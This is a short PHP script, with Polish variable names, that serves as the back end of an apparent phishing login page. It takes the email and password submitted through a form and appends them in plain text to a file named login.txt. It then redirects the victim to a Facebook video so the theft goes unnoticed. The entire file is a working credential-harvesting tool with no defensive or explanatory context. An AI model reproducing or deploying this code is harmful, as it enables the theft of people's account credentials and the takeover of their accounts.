<?php

$email = $_POST["email"];
$pass = $_POST["password"];

$tekst = "Email: $email Hasło: $pass \r\n";

$uchwyt = fopen("login.txt", "a");

fwrite($uchwyt, $tekst);
fclose($uchwyt);
header("Location: https://www.facebook.com/100067439600140/videos/896725718103052")
?>